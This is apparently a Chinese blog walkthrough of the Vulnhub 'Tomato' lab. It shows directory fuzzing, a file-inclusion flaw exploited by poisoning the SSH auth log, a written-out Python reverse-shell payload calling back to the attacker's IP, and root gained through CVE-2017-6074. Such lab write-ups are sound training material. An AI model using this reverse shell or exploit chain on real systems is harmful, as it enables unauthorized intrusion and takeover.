---
title: Tomato
date: 2021-12-24 20:35:20
tags: Vulnhub
categories: 文件包含漏洞
---

## 信息收集
运行我们的bash脚本，发现目标系统开放了ftp和web服务
![在这里插入图片描述](https://img-blog.csdnimg.cn/b2f1b07f20b74e8cbbf09d8aceb93286.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们尝试是否可以匿名登录ftp，未果
![在这里插入图片描述](https://img-blog.csdnimg.cn/074a7cd93bf64ed3aa33a1e7ba57281e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

我们访问web服务，发现是一个番茄图片，查看源码也没什么发现
![在这里插入图片描述](https://img-blog.csdnimg.cn/6fbb54145b634516a076f26d15d098ad.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们fuzz一下路径，发现了存在一个antibot_image路径

```bash
dirsearch -u "http://192.168.101.197/" -e * -x404,500,403 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/fa0487042a3d48909ab79d96a12532a8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

我们发现存在一个info.php文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/a59aa7bf23b2400cb4fd41b01cea33d7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
文件的源码提示我们存在文件包含漏洞
![在这里插入图片描述](https://img-blog.csdnimg.cn/39d170ef77ee482988bbfd4d37ecc20b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们验证漏洞确实是真实存在的
![在这里插入图片描述](https://img-blog.csdnimg.cn/b6bee6c21fc2499999963c8682e6f3cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

## 漏洞利用
我们尝试将一句话写进日志文件中，日志文件的路径为`/var/log/auth.log`，发现已被写入日志并成功执行我们的命令
![在这里插入图片描述](https://img-blog.csdnimg.cn/8fc98d199a4845c1a5e8d72245c7b934.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/bf1f3a8f67a6457998b22f5bd225ccc2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
那么我们就可以查找python是否存在，若存在则可以反弹shell到我们本地的机子上。可以看到python是存在的，并且版本为3.5
![在这里插入图片描述](https://img-blog.csdnimg.cn/4d606cef990543d381d880d6a94f170c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们将执行如下的payload添加到cmd参数后获得一个shell

```python
python3 -c 'import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.101.196",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])'
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/8ac1207e853b4bfa8655671b22b4939d.png)
## 提权
我们将linpeas.sh脚本上传到靶机上，并执行它
![在这里插入图片描述](https://img-blog.csdnimg.cn/23a8477f887a40c3b6df7f1df69d406b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
发现存在一个linux内核漏洞
![在这里插入图片描述](https://img-blog.csdnimg.cn/e962cb6858c242bea4f04c0d8d28b3b1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们发现这个内核漏洞对应的漏洞编号为`CVE-2017-6074`，我们将其编译变上传到靶机上，执行即root
![在这里插入图片描述](https://img-blog.csdnimg.cn/8d5db74c976140df8fd5b0d408768a02.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/335e4f13aa7e4d8c9ebaf95cb4c8749c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
